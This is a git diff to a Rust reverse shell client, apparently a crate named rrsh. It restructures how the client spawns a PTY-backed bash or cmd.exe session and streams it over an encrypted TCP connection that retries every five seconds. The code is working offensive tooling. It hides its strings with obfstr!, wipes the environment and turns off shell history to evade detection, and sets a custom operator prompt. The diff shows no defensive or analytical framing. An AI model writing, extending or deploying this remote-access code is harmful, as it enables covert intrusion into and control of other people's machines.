@@ -15,50 +15,81 @@ use rrsh::{HandshakeRole, do_handshake};
 #[tokio::main]
 async fn main() {
     loop {
-        match reverse_shell().await {
-            Ok(_) => println!("[*] Goodbye."),
-            Err(e) => eprintln!("[!] Connection error: {}. Retrying in 5 seconds...", e),
+        tokio::select! {
+            result = reverse_shell() => {
+                match result {
+                    Ok(_) => {
+                        println!("[*] Reverse shell session ended normally.");
+                    }
+                    Err(e) => {
+                        eprintln!("[!] Reverse shell session error: {}", e);
+                    }
+                }
+            }
+
+            _ = tokio::signal::ctrl_c() => {
+                println!("\r\n[!] Ctrl-C received, exiting.");
+                break;
+            }
         }
 
         tokio::time::sleep(Duration::from_secs(5)).await;
     }
 }
 
-fn shell_setup() -> Result<portable_pty::PtyPair, Box<dyn std::error::Error>> {
-    let pty_system = NativePtySystem::default();
-    // TODO: For this, we would need a custom signaling protocol - we might look at this later
-    let pty_pair = pty_system
-        .openpty(PtySize {
-            rows: 24,
-            cols: 80,
-            pixel_width: 0,
-            pixel_height: 0,
+struct PtySession {
+    pty_pair: portable_pty::PtyPair,
+    child: Box<dyn portable_pty::Child + Send + Sync>,
+}
+
+impl PtySession {
+    pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
+        let pty_system = NativePtySystem::default();
+        // TODO: For this, we would need a custom signaling protocol - we might look at this later
+        let pty_pair = pty_system
+            .openpty(PtySize {
+                rows: 24,
+                cols: 80,
+                pixel_width: 0,
+                pixel_height: 0,
+            })
+            .map_err(|e| format!("failed to create pty: {}", e))?;
+
+        let mut _cmd;
+
+        #[cfg(not(target_os = "windows"))]
+        {
+            _cmd = CommandBuilder::new(obfstr!("/bin/bash"));
+            _cmd.env_clear();
+            _cmd.env(obfstr!("TERM"), obfstr!("xterm-256color"));
+            _cmd.env(obfstr!("PS1"), obfstr!("[V] \\u@\\h:\\w\\$ "));
+            _cmd.env(obfstr!("HISTFILESIZE"), "0");
+            _cmd.env(obfstr!("HISTSIZE"), "0");
+        }
+
+        #[cfg(target_os = "windows")]
+        {
+            _cmd = CommandBuilder::new(obfstr!("cmd.exe"));
+            _cmd.env(obfstr!("PROMPT"), obfstr!("[V] $P$G "));
+        }
+
+        let _sh = pty_pair
+            .slave
+            .spawn_command(_cmd)
+            .map_err(|e| format!("failed to spawn: {}", e))?;
+
+        Ok(Self {
+            pty_pair,
+            child: _sh,
         })
-        .map_err(|e| format!("failed to create pty: {}", e))?;
-
-    let mut _cmd;
-
-    #[cfg(not(target_os = "windows"))]
-    {
-        _cmd = CommandBuilder::new(obfstr!("/bin/bash"));
-        _cmd.env_clear();
-        _cmd.env(obfstr!("TERM"), obfstr!("xterm-256color"));
-        _cmd.env(obfstr!("PS1"), obfstr!("[V] \\u@\\h:\\w\\$ "));
-        _cmd.env(obfstr!("HISTFILESIZE"), "0");
-        _cmd.env(obfstr!("HISTSIZE"), "0");
     }
+}
 
-    #[cfg(target_os = "windows")]
-    {
-        _cmd = CommandBuilder::new(obfstr!("cmd.exe"));
-        _cmd.env(obfstr!("PROMPT"), obfstr!("[V] $P$G "));
+impl Drop for PtySession {
+    fn drop(&mut self) {
+        let _ = self.child.kill();
+        let _ = self.child.wait();
     }
-
-    let _sh = pty_pair
-        .slave
-        .spawn_command(_cmd)
-        .map_err(|e| format!("failed to spawn: {}", e))?;
-    Ok(pty_pair)
 }
 
 async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
@@ -80,10 +111,10 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
     let mut frame_reader = FramedRead::new(tcp_reader, EncryptedCodec::new(cipher_rx));
     let mut frame_writer = FramedWrite::new(tcp_writer, EncryptedCodec::new(cipher_tx));
 
-    let pty_pair = shell_setup()?;
+    let shell = PtySession::new().map_err(|e| format!("failed to start shell: {}", e))?;
 
-    let mut pty_reader = pty_pair.master.try_clone_reader()?;
-    let mut pty_writer = pty_pair.master.take_writer()?;
+    let mut pty_reader = shell.pty_pair.master.try_clone_reader()?;
+    let mut pty_writer = shell.pty_pair.master.take_writer()?;
 
     let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);
 
@@ -123,7 +154,7 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
                 }
             }
 
-            else => break
+            else => break,
         }
     }
 
